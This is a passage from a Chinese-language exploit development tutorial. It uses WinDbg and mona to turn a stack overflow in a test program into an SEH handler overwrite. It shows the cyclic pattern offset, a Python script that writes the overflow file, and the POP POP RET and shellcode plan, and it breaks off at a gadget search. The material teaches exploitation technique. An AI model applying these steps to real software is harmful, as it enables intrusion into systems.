bp4 <span class="hljs-keyword">at</span> <span class="hljs-number">61616161</span> failed
WaitForEvent failed
eax&#61;<span class="hljs-number">002</span>b7be8 ebx&#61;<span class="hljs-number">000000</span>c8 ecx&#61;<span class="hljs-number">0000002</span>c edx&#61;<span class="hljs-number">00000000</span> esi&#61;<span class="hljs-number">00178418</span> edi&#61;<span class="hljs-number">003</span>d0000
eip&#61;<span class="hljs-number">738</span>ce33d esp&#61;<span class="hljs-number">003</span>cf990 ebp&#61;<span class="hljs-number">003</span>cf9b0 iopl&#61;<span class="hljs-number">0</span>         nv up ei pl nz ac po nc
cs&#61;<span class="hljs-number">0023</span>  ss&#61;<span class="hljs-number">002</span>b  ds&#61;<span class="hljs-number">002</span>b  es&#61;<span class="hljs-number">002</span>b  fs&#61;<span class="hljs-number">0053</span>  gs&#61;<span class="hljs-number">002</span>b             efl&#61;<span class="hljs-number">00010212</span>
MSVCR110!memcpy&#43;<span class="hljs-number">0x21e</span>:
<span class="hljs-number">738</span>ce33d f3a5            rep movs dword ptr es:[edi],dword ptr [esi]

<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; !address <span class="hljs-number">0x61616161</span>
Usage:                  Free
Base Address:           <span class="hljs-number">013</span>c6000
End Address:            <span class="hljs-number">735</span>d0000
Region Size:            <span class="hljs-number">7220</span>a000
State:                  <span class="hljs-number">00010000</span>    MEM_FREE
Protect:                <span class="hljs-number">00000001</span>    PAGE_NOACCESS
Type:                   &lt;info <span class="hljs-operator">not</span> present <span class="hljs-keyword">at</span> <span class="hljs-operator">the</span> target&gt;</code></pre> 
<p>既然如此&#xff0c;就把这个位置的断点清掉&#xff0c;我们用硬件断点来设断。</p> 
<pre class="prettyprint"><code class=" hljs ruby"><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">000</span>&gt; bl
 <span class="hljs-number">0</span> e <span class="hljs-number">013</span>c100<span class="hljs-number">0</span>     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> test_x86_wo_safeseh_dep!main
 <span class="hljs-number">1</span> d <span class="hljs-number">013</span>c10e7     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span>
 <span class="hljs-number">2</span> e <span class="hljs-number">013</span>c10fe     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xfe</span>
 <span class="hljs-number">3</span> e <span class="hljs-number">738</span>da6e<span class="hljs-number">0</span>     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> <span class="hljs-constant">MSVCR110</span>!_except_handler4
 <span class="hljs-number">4</span> e <span class="hljs-number">61616161</span>     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> 
<span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">000</span>&gt; bc <span class="hljs-number">4</span>

<span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">000</span>&gt; ba e1 <span class="hljs-number">0x61616161</span>
<span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">000</span>&gt; bl
 <span class="hljs-number">0</span> e <span class="hljs-number">013</span>c100<span class="hljs-number">0</span>     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> test_x86_wo_safeseh_dep!main
 <span class="hljs-number">1</span> d <span class="hljs-number">013</span>c10e7     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xe7</span>
 <span class="hljs-number">2</span> e <span class="hljs-number">013</span>c10fe     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0xfe</span>
 <span class="hljs-number">3</span> e <span class="hljs-number">738</span>da6e<span class="hljs-number">0</span>     <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span> <span class="hljs-constant">MSVCR110</span>!_except_handler4
 <span class="hljs-number">4</span> e <span class="hljs-number">61616161</span> e <span class="hljs-number">1</span> <span class="hljs-number">0001</span> (<span class="hljs-number">0001</span>)  <span class="hljs-number">0</span><span class="hljs-symbol">:****</span></code></pre> 
<p>我们再继续执行&#xff0c;可以看到依然是在fread中调用memcpy中&#xff0c;调用RtlDispatchException找合适的异常处理函数&#xff0c;先找到except_handler4&#xff0c;except_handler4处理不了&#xff0c;继续往下一个找&#xff0c;也就是0x61616161&#xff0c;这也就是为什么最后&#xff0c;我们会发现crash时&#xff0c;EIP是0x61616161的原因了。</p> 
<pre class="prettyprint"><code class=" hljs erlang-repl"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
<span class="hljs-variable">Breakpoint</span> <span class="hljs-number">3</span> <span class="hljs-function_or_atom">hit</span>
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">738</span>da6e0 <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">7737</span>b46d <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00000000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">738</span>da6e0 <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">003</span>cf3f4 <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">003</span>cf414 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">zr</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">pe</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00000246</span>
<span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_except_handler4:
<span class="hljs-number">738</span>da6e0 <span class="hljs-number">55</span>              <span class="hljs-function_or_atom">push</span>    <span class="hljs-function_or_atom">ebp</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">k</span>
<span class="hljs-variable">ChildEBP</span> <span class="hljs-variable">RetAddr</span>  
<span class="hljs-number">003</span>cf3f0 <span class="hljs-number">7737</span>b459 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_except_handler4
<span class="hljs-number">003</span>cf414 <span class="hljs-number">7737</span>b42b <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">ExecuteHandler2</span>&#43;<span class="hljs-number">0</span>x26
<span class="hljs-number">003</span>cf438 <span class="hljs-number">7737</span>b3ce <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">ExecuteHandler</span>&#43;<span class="hljs-number">0</span>x24
<span class="hljs-number">003</span>cf4c4 <span class="hljs-number">77330133</span> <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">RtlDispatchException</span>&#43;<span class="hljs-number">0</span>x127
<span class="hljs-number">003</span>cf4c4 <span class="hljs-number">738</span>ce33d <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">KiUserExceptionDispatcher</span>&#43;<span class="hljs-number">0</span>xf
<span class="hljs-number">003</span>cf994 <span class="hljs-number">738</span>ce3b7 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">memcpy</span>&#43;<span class="hljs-number">0</span>x21e
<span class="hljs-number">003</span>cf9b0 <span class="hljs-number">738</span>d8855 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">memcpy_s</span>&#43;<span class="hljs-number">0</span>x3e
<span class="hljs-number">003</span>cf9e4 <span class="hljs-number">738</span>d88c1 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_fread_nolock_s&#43;<span class="hljs-number">0</span>xd3
<span class="hljs-number">003</span>cfa2c <span class="hljs-number">738</span>d8912 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread_s</span>&#43;<span class="hljs-number">0</span>x6b
<span class="hljs-number">003</span>cfa48 <span class="hljs-number">013</span>c10ed <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread</span>&#43;<span class="hljs-number">0</span>x16
<span class="hljs-number">003</span>cfa94 <span class="hljs-number">61616161</span> <span class="hljs-function_or_atom">test_x86_wo_safeseh_dep</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">main</span>&#43;<span class="hljs-number">0</span>xed [<span class="hljs-function_or_atom">z</span>:\<span class="hljs-function_or_atom">d_disk</span>\<span class="hljs-function_or_atom">workspace</span>\<span class="hljs-function_or_atom">vs_2012</span>\<span class="hljs-function_or_atom">test</span>\<span class="hljs-function_or_atom">stack_overflow</span>.<span class="hljs-function_or_atom">cpp</span> &#64; <span class="hljs-number">22</span>]

<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
<span class="hljs-variable">Breakpoint</span> <span class="hljs-number">4</span> <span class="hljs-function_or_atom">hit</span>
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">61616161</span> <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">7737</span>b46d <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00000000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">61616161</span> <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">003</span>cf3f4 <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">003</span>cf414 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">zr</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">pe</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00000246</span>
<span class="hljs-number">61616161</span> ??              ???
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">k</span>
<span class="hljs-variable">ChildEBP</span> <span class="hljs-variable">RetAddr</span>  
<span class="hljs-number">003</span>cf3f0 <span class="hljs-number">7737</span>b459 <span class="hljs-number">0</span>x61616161
<span class="hljs-number">003</span>cf414 <span class="hljs-number">7737</span>b42b <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">ExecuteHandler2</span>&#43;<span class="hljs-number">0</span>x26
<span class="hljs-number">003</span>cf438 <span class="hljs-number">7737</span>b3ce <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">ExecuteHandler</span>&#43;<span class="hljs-number">0</span>x24
<span class="hljs-number">003</span>cf4c4 <span class="hljs-number">77330133</span> <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">RtlDispatchException</span>&#43;<span class="hljs-number">0</span>x127
<span class="hljs-number">003</span>cf4c4 <span class="hljs-number">738</span>ce33d <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">KiUserExceptionDispatcher</span>&#43;<span class="hljs-number">0</span>xf
<span class="hljs-number">003</span>cf994 <span class="hljs-number">738</span>ce3b7 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">memcpy</span>&#43;<span class="hljs-number">0</span>x21e
<span class="hljs-number">003</span>cf9b0 <span class="hljs-number">738</span>d8855 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">memcpy_s</span>&#43;<span class="hljs-number">0</span>x3e
<span class="hljs-number">003</span>cf9e4 <span class="hljs-number">738</span>d88c1 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_fread_nolock_s&#43;<span class="hljs-number">0</span>xd3
<span class="hljs-number">003</span>cfa2c <span class="hljs-number">738</span>d8912 <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread_s</span>&#43;<span class="hljs-number">0</span>x6b
<span class="hljs-number">003</span>cfa48 <span class="hljs-number">013</span>c10ed <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread</span>&#43;<span class="hljs-number">0</span>x16
<span class="hljs-number">003</span>cfa94 <span class="hljs-number">61616161</span> <span class="hljs-function_or_atom">test_x86_wo_safeseh_dep</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">main</span>&#43;<span class="hljs-number">0</span>xed [<span class="hljs-function_or_atom">z</span>:\<span class="hljs-function_or_atom">d_disk</span>\<span class="hljs-function_or_atom">workspace</span>\<span class="hljs-function_or_atom">vs_2012</span>\<span class="hljs-function_or_atom">test</span>\<span class="hljs-function_or_atom">stack_overflow</span>.<span class="hljs-function_or_atom">cpp</span> &#64; <span class="hljs-number">22</span>]</code></pre> 
<p>有了上面的分析理解&#xff0c;可以有助于我们理解exploit的利用原理。下面我们会介绍如何利用这个crash来开发一个exploit。 <br /> 前面我们知道可以通过栈溢出来覆写exception handler&#xff0c;既然如此&#xff0c;我们需要知道相对偏移的位置是多少&#xff0c;可以使用MONA生成长度为10000的Pattern</p> 
<pre class="prettyprint"><code class=" hljs applescript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; !py mona pc <span class="hljs-number">10000</span>
Hold <span class="hljs-function_start"><span class="hljs-keyword">on</span>.</span>..
[&#43;] Command used:
!py mona.py pc <span class="hljs-number">10000</span>
Creating cyclic pattern <span class="hljs-keyword">of</span> <span class="hljs-number">10000</span> bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8...Mu0Mu1Mu2Mu3Mu4Mu5Mu6Mu7Mu8Mu9Mv0Mv1Mv2M
[&#43;] Preparing output <span class="hljs-type">file</span> &#39;pattern.txt&#39;
    - Creating working folder c:\mona\test_x86_wo_safeseh_dep
    - Folder created
    - (Re)setting logfile c:\mona\test_x86_wo_safeseh_dep\pattern.txt
Note: don&#39;t <span class="hljs-keyword">copy</span> this pattern <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> <span class="hljs-command">log</span> window, <span class="hljs-keyword">it</span> might be truncated !
It&#39;s better <span class="hljs-keyword">to</span> open c:\mona\test_x86_wo_safeseh_dep\pattern.txt <span class="hljs-keyword">and</span> <span class="hljs-keyword">copy</span> <span class="hljs-keyword">the</span> pattern <span class="hljs-keyword">from</span> <span class="hljs-keyword">the</span> <span class="hljs-type">file</span>
[&#43;] This mona.py action took <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.047000</span></code></pre> 
<p>将这个pattern作为msg.dat的内容&#xff0c;再看看crash的位置。</p> 
<pre class="prettyprint"><code class=" hljs applescript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; g
(adc<span class="hljs-number">.37</span>c): Access violation - code c0000005 (<span class="hljs-keyword">first</span> chance)
First chance exceptions are reported <span class="hljs-keyword">before</span> any exception handling.
This exception may be expected <span class="hljs-keyword">and</span> handled.
eax&#61;<span class="hljs-number">00000000</span> ebx&#61;<span class="hljs-number">00000000</span> ecx&#61;<span class="hljs-number">64413963</span> edx&#61;<span class="hljs-number">7737</span>b46d esi&#61;<span class="hljs-number">00000000</span> edi&#61;<span class="hljs-number">00000000</span>
eip&#61;<span class="hljs-number">64413963</span> esp&#61;<span class="hljs-number">003</span>af790 ebp&#61;<span class="hljs-number">003</span>af7b0 iopl&#61;<span class="hljs-number">0</span>         nv up ei pl zr na pe nc
cs&#61;<span class="hljs-number">0023</span>  ss&#61;<span class="hljs-number">002</span>b  ds&#61;<span class="hljs-number">002</span>b  es&#61;<span class="hljs-number">002</span>b  fs&#61;<span class="hljs-number">0053</span>  gs&#61;<span class="hljs-number">002</span>b             efl&#61;<span class="hljs-number">00010246</span>
<span class="hljs-number">64413963</span> ??              ???
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; !py mona po <span class="hljs-number">64413963</span>
Hold <span class="hljs-function_start"><span class="hljs-keyword">on</span>.</span>..
[&#43;] Command used:
!py mona.py po <span class="hljs-number">64413963</span>
Looking <span class="hljs-keyword">for</span> c9Ad <span class="hljs-keyword">in</span> pattern <span class="hljs-keyword">of</span> <span class="hljs-number">500000</span> bytes
 - Pattern c9Ad (<span class="hljs-number">0x64413963</span>) found <span class="hljs-keyword">in</span> cyclic pattern <span class="hljs-keyword">at</span> position <span class="hljs-number">88</span>
Looking <span class="hljs-keyword">for</span> c9Ad <span class="hljs-keyword">in</span> pattern <span class="hljs-keyword">of</span> <span class="hljs-number">500000</span> bytes
Looking <span class="hljs-keyword">for</span> dA9c <span class="hljs-keyword">in</span> pattern <span class="hljs-keyword">of</span> <span class="hljs-number">500000</span> bytes
 - Pattern dA9c <span class="hljs-keyword">not</span> found <span class="hljs-keyword">in</span> cyclic pattern (uppercase)  
Looking <span class="hljs-keyword">for</span> c9Ad <span class="hljs-keyword">in</span> pattern <span class="hljs-keyword">of</span> <span class="hljs-number">500000</span> bytes
Looking <span class="hljs-keyword">for</span> dA9c <span class="hljs-keyword">in</span> pattern <span class="hljs-keyword">of</span> <span class="hljs-number">500000</span> bytes
 - Pattern dA9c <span class="hljs-keyword">not</span> found <span class="hljs-keyword">in</span> cyclic pattern (lowercase)  
[&#43;] This mona.py action took <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.281000</span></code></pre> 
<p>看来offset是88&#xff0c;这样&#xff0c;我们可以利用下面的python脚本生成一个特殊的msg.dat&#xff0c;如果与我们预期一致的话&#xff0c;新的crash中EIP应该是0x62626262</p> 
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">with</span> open(<span class="hljs-string">r&#39;msg.dat&#39;</span>, <span class="hljs-string">&#39;wb&#39;</span>) <span class="hljs-keyword">as</span> f:
    data &#61; <span class="hljs-string">&#39;a&#39;</span>*<span class="hljs-number">88</span> &#43; <span class="hljs-string">&#39;b&#39;</span>*<span class="hljs-number">4</span> &#43; <span class="hljs-string">&#39;c&#39;</span>*<span class="hljs-number">10000</span>
    f.write(data)</code></pre> 
<p>WinDBG中的调试信息&#xff1a;</p> 
<pre class="prettyprint"><code class=" hljs cpp"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; g
(<span class="hljs-number">790.434</span>): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax&#61;<span class="hljs-number">00000000</span> ebx&#61;<span class="hljs-number">00000000</span> ecx&#61;<span class="hljs-number">62626262</span> edx&#61;<span class="hljs-number">7737</span>b46d esi&#61;<span class="hljs-number">00000000</span> edi&#61;<span class="hljs-number">00000000</span>
eip&#61;<span class="hljs-number">62626262</span> esp&#61;<span class="hljs-number">0031f</span>3c8 ebp&#61;<span class="hljs-number">0031f</span>3e8 iopl&#61;<span class="hljs-number">0</span>         nv up ei pl zr na pe nc
cs&#61;<span class="hljs-number">0023</span>  ss&#61;<span class="hljs-number">002</span>b  ds&#61;<span class="hljs-number">002</span>b  es&#61;<span class="hljs-number">002</span>b  fs&#61;<span class="hljs-number">0053</span>  gs&#61;<span class="hljs-number">002</span>b             efl&#61;<span class="hljs-number">00010246</span>
<span class="hljs-number">62626262</span> ??              ???
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; dd esp l200
<span class="hljs-number">0031f</span>3c8  <span class="hljs-number">7737</span>b459 <span class="hljs-number">0031f</span>4b0 <span class="hljs-number">0031f</span>a98 <span class="hljs-number">0031f</span>500
<span class="hljs-number">0031f</span>3d8  <span class="hljs-number">0031f</span>484 <span class="hljs-number">0031f</span>9f0 <span class="hljs-number">7737</span>b46d <span class="hljs-number">0031f</span>a98
<span class="hljs-number">0031f</span>3e8  <span class="hljs-number">0031f</span>498 <span class="hljs-number">7737</span>b42b <span class="hljs-number">0031f</span>4b0 <span class="hljs-number">0031f</span>a98
<span class="hljs-number">0031f</span>3f8  <span class="hljs-number">0031f</span>500 <span class="hljs-number">0031f</span>484 <span class="hljs-number">62626262</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0031f</span>408  <span class="hljs-number">0031f</span>4b0 <span class="hljs-number">0031f</span>a98 <span class="hljs-number">7737</span>b3ce <span class="hljs-number">0031f</span>4b0
<span class="hljs-number">0031f</span>418  <span class="hljs-number">0031f</span>a98 <span class="hljs-number">0031f</span>500 <span class="hljs-number">0031f</span>484 <span class="hljs-number">62626262</span>
<span class="hljs-number">0031f</span>428  <span class="hljs-number">00320000</span> <span class="hljs-number">0031f</span>4b0 <span class="hljs-number">005e8444</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0031f</span>438  <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span> <span class="hljs-number">00000000</span>
...
<span class="hljs-number">0031f</span>a28  <span class="hljs-number">00000001</span> <span class="hljs-number">000000</span>c8 <span class="hljs-number">73817060</span> <span class="hljs-number">00000000</span>
<span class="hljs-number">0031f</span>a38  <span class="hljs-number">00000000</span> <span class="hljs-number">00000001</span> <span class="hljs-number">0000276</span>c <span class="hljs-number">61616161</span>
<span class="hljs-number">0031f</span>a48  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0031f</span>a58  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0031f</span>a68  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0031f</span>a78  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0031f</span>a88  <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span> <span class="hljs-number">61616161</span>
<span class="hljs-number">0031f</span>a98  <span class="hljs-number">61616161</span> <span class="hljs-number">62626262</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> &lt;--ESP&#43;<span class="hljs-number">8</span>的内容指向这里
<span class="hljs-number">0031f</span>aa8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>ab8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>ac8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>ad8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>ae8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>af8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b08  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b18  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b28  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b38  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b48  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b58  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b68  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b78  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b88  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>b98  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>ba8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span>
<span class="hljs-number">0031f</span>bb8  <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span> <span class="hljs-number">63636363</span></code></pre> 
<p>看来一切如我们预期的一样&#xff01; <br /> 此时&#xff0c;看看当前栈上的情况&#xff0c;ESP&#43;8这个位置所存放的值正好是最终会执行的exception hander所对应的_EXCEPTION_REGISTRATION_RECORD节点地址</p> 
<pre class="prettyprint"><code class=" hljs css">0<span class="hljs-pseudo">:000</span>&gt; <span class="hljs-tag">dt</span> _<span class="hljs-tag">EXCEPTION_REGISTRATION_RECORD</span> 0031<span class="hljs-tag">fa98</span>
<span class="hljs-tag">test_x86_wo_safeseh_dep</span>!_<span class="hljs-tag">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;0<span class="hljs-tag">x000</span> <span class="hljs-tag">Next</span>             : 0<span class="hljs-tag">x61616161</span> _<span class="hljs-tag">EXCEPTION_REGISTRATION_RECORD</span>
   &#43;0<span class="hljs-tag">x004</span> <span class="hljs-tag">Handler</span>          : 0<span class="hljs-tag">x62626262</span>     _<span class="hljs-tag">EXCEPTION_DISPOSITION</span>  &#43;62626262</code></pre> 
<p>同时&#xff0c;这个地址的内容是可以被我们所控制的&#xff0c;我们可以写入任意值。 <br /> 常用的思路是将原先的’bbbb’修改为POP,POP,RET的地址&#xff0c;这样&#xff0c;就会执行到上面介绍的0031fa98&#xff0c;然后&#xff0c;将0031fa98的内容改为JMP&#xff0c;然后将0x63636363修改为shellcode <br /> <img src="https://img-blog.csdn.net/20161218231110777?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZHVwZWk&#61;/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA&#61;&#61;/dissolve/70/gravity/SouthEast" alt="JMP图示" title="" /></p> 
<p>使用MONA在ntdll和kernel32中搜索POP,POP,RET的指令</p> 
<pre class="prettyprint"><code class=" hljs vbscript"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; !py mona fw -s <span class="hljs-string">&#34;pop r32#pop r32#ret&#34;</span> -m ntdll,kernel32
